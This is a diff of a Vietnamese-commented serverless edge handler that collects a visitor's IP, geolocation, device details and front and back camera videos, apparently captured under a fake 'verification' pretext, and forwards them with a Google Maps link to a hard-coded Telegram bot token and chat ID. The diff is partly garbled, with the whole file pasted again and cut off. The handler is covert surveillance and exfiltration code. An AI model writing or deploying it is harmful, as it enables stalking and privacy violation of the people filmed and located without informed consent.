@@ -8,7 +8,7 @@ export default async function handler(req) {
     return new Response("Method Not Allowed", { status: 405 });
 
   try {
-    // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ TỪ SERVER
+    // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ
     const userIP =
       req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
     
@@ -24,7 +24,7 @@ export default async function handler(req) {
     const lon = geo.longitude || "0";
     const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
 
-    // 2. NHẬN DỮ LIỆU TỪ CLIENT
+    // 2. NHẬN DỮ LIỆU
     const contentType = req.headers.get("content-type") || "";
     let clientData = {};
     let formData = null;
@@ -39,7 +39,7 @@ export default async function handler(req) {
     const hasFront = formData && formData.has("front");
     const hasBack = formData && formData.has("back");
 
-    // 3. TẠO CAPTION THÔNG TIN
+    // 3. TẠO CAPTION
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
 
@@ -54,64 +54,202 @@ export default async function handler(req) {
 📍 Kinh độ: ${lon}
 🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
 🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}
-⏱️ Thời lượng: 10 giây cho mỗi video
+⏱️ Thời lượng: 8 giây mỗi video
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
 `.trim();
 
-    // 4. GỬI ĐẾN TELEGRAM
+    // 4. GỬI VIDEO LÊN TELEGRAM
     if (hasFront || hasBack) {
-      // Gửi video nếu quay được
-      const teleForm = new FormData();
-      teleForm.append("chat_id", CHAT_ID);
+      let frontResult = null;
+      let backResult = null;
 
       // Gửi video trước
       if (hasFront) {
-        teleForm.append("video", formData.get("front"));
-        teleForm.append("caption", finalCaption);
+        const frontFile = formData.get("front");
+        const frontForm = new FormData();
+        frontForm.append("chat_id", CHAT_ID);
+        frontForm.append("video", frontFile);
+        frontForm.append("caption", finalCaption);
+        frontForm.append("supports_streaming", "true");
+
+        frontResult = await fetch(
+          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
+          {
+            method: "POST",
+            body: frontForm,
+          }
+        );
       }
 
-      // Gửi video sau (gửi sau với caption rỗng hoặc không)
+      // Gửi video sau
       if (hasBack) {
-        const res = await fetch(
-          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
-          {
-            method: "POST",
-            body: teleForm,
-          }
-        );
-        
-        // Tạo form mới cho video sau
-        const teleForm2 = new FormData();
-        teleForm2.append("chat_id", CHAT_ID);
-        teleForm2.append("video", formData.get("back"));
+        const backFile = formData.get("back");
+        const backForm = new FormData();
+        backForm.append("chat_id", CHAT_ID);
+        backForm.append("video", backFile);
         if (!hasFront) {
-          teleForm2.append("caption", finalCaption);
+          backForm.append("caption", finalCaption);
         }
-        
-        const res2 = await fetch(
+        backForm.append("supports_streaming", "true");
+
+        backResult = await fetch(
           `https://api.telegram.org/bot${TOKEN}/sendVideo`,
           {
             method: "POST",
-            body: teleForm2,
+            body: backForm,
           }
         );
-        
-        return new Response(await res2.text(), { status: 200 });
       }
 
-      // Nếu chỉ có front
+      // Trả về kết quả
+      const response = {
+        front: frontResult ? await frontResult.text() : null,
+        back: backResult ? await backResult.text() : null
+      };
+      
+      return new Response(JSON.stringify(response), { 
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      });
+      
+    } else {
+      // Gửi text nếu không có video
       const res = await fetch(
-        `https://api.telegram.org/bot${TOKEN}/sendVideo`,
+        `https://api.telegram.org/bot${TOKEN}/sendMessage`,
         {
           method: "POST",
-          body: teleForm,
-        }
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: finalCaption,
+          }),
+        },
       );
       return new Response(await res.text(), { status: 200 });
+    }
+  } catch (err) {
+    return new Response(JSON.stringify({ error: err.message }), {
+      status: 500,
+    });
+  }
+}export const config = { runtime: "edge" };
 
+export default async function handler(req) {
+  const TOKEN = "8962152623:AAH2gxqS-QXfs_bYaHHwoPG6xv7pWJXLSmY";
+  const CHAT_ID = 8523959891;
+  
+  if (req.method !== "POST")
+    return new Response("Method Not Allowed", { status: 405 });
+
+  try {
+    // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ
+    const userIP =
+      req.headers.get("x-forwarded-for")?.split(",")[0] || "Unknown";
+    
+    let geo = {};
+    try {
+      const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
+      geo = await geoRes.json();
+    } catch (e) {
+      geo = {};
+    }
+
+    const lat = geo.latitude || "0";
+    const lon = geo.longitude || "0";
+    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
+
+    // 2. NHẬN DỮ LIỆU
+    const contentType = req.headers.get("content-type") || "";
+    let clientData = {};
+    let formData = null;
+
+    if (contentType.includes("multipart/form-data")) {
+      formData = await req.formData();
+      clientData = JSON.parse(formData.get("clientInfo") || "{}");
     } else {
-      // Gửi tin nhắn văn bản nếu không quay được video
+      clientData = await req.json();
+    }
+
+    const hasFront = formData && formData.has("front");
+    const hasBack = formData && formData.has("back");
+
+    // 3. TẠO CAPTION
+    const finalCaption = `
+📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
+
+🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
+📱 Thiết bị: ${clientData.device || "Unknown"}
+🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
+🌍 IP dân cư: ${userIP}
+🏢 ISP: ${geo.asName || "VNNIC"}
+🏙️ Địa chỉ: ${address}
+🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
+📍 Vĩ độ: ${lat}
+📍 Kinh độ: ${lon}
+🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
+🎥 Video: ${clientData.camera || "✅ Đã quay thành công"}
+⏱️ Thời lượng: 8 giây mỗi video
+
+⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
+`.trim();
+
+    // 4. GỬI VIDEO LÊN TELEGRAM
+    if (hasFront || hasBack) {
+      let frontResult = null;
+      let backResult = null;
+
+      // Gửi video trước
+      if (hasFront) {
+        const frontFile = formData.get("front");
+        const frontForm = new FormData();
+        frontForm.append("chat_id", CHAT_ID);
+        frontForm.append("video", frontFile);
+        frontForm.append("caption", finalCaption);
+        frontForm.append("supports_streaming", "true");
+
+        frontResult = await fetch(
+          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
+          {
+            method: "POST",
+            body: frontForm,
+          }
+        );
+      }
+
+      // Gửi video sau
+      if (hasBack) {
+        const backFile = formData.get("back");
+        const backForm = new FormData();
+        backForm.append("chat_id", CHAT_ID);
+        backForm.append("video", backFile);
+        if (!hasFront) {
+          backForm.append("caption", finalCaption);
+        }
+        backForm.append("supports_streaming", "true");
+
+        backResult = await fetch(
+          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
+          {
+            method: "POST",
+            body: backForm,
+          }
+        );
+      }
+
+      // Trả về kết quả
+      const response = {
+        front: frontResult ? await frontResult.text() : null,
+        back: backResult ? await backResult.text() : null
+      };
+      
+      return new Response(JSON.stringify(response), { 
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      });
+      
+    } else {
+      // Gửi text nếu không có video
       const res = await fetch(
         `https://api.telegram.org/bot${TOKEN}/sendMessage`,
         {
